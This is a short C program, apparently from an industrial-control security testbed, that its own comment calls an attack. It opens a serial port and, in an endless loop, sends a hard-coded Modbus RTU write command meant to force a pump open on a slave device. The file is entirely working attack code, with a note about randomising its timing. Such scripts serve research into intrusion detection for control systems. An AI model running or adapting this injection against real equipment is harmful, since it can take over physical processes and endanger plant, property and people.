/* This attack will send an "open pump" command to the slave*/

#define FORLINUX
#include "../modbusrepo/modbus.h"
#define NUMPDU 2

int main(int argc, char *argv[]) {
  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];


  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;

  strcpy(inport,"/dev/ttyS0");
  strcpy(outport,"/dev/ttyS1");
  
  for (i=1;i<argc;i++) {
   if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(outport, argv[i+1],len+1); 
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) { 
   return (port);
  }

  printf("open %s ok port = %d\n", outport, port);

 while (1) {  

    addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x10;
    datalen = 25;
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x0a;
    data[4] = 0x14;
    data[5] = 0x00;
    data[6] = 0x01;
    data[7] = 0x00;
    data[8] = 0x01;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x00;
    data[16] = 0x00;
    data[17] = 0x00;
    data[18] = 0x0a;
    data[19] = 0x00;
    data[20] = 0x0a;
    data[21] = 0x00;
    data[22] = 0x5a;
    data[23] = 0x00;
    data[24] = 0x5a;
    crc[0] = 0xac;
    crc[1] = 0x59;

 pdu = mkpdu(addr, fc, data, datalen, crc);
 printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu); //Send write command
 freepdu(pdu);
 sleep(1); // change to random time in the future.



}
}
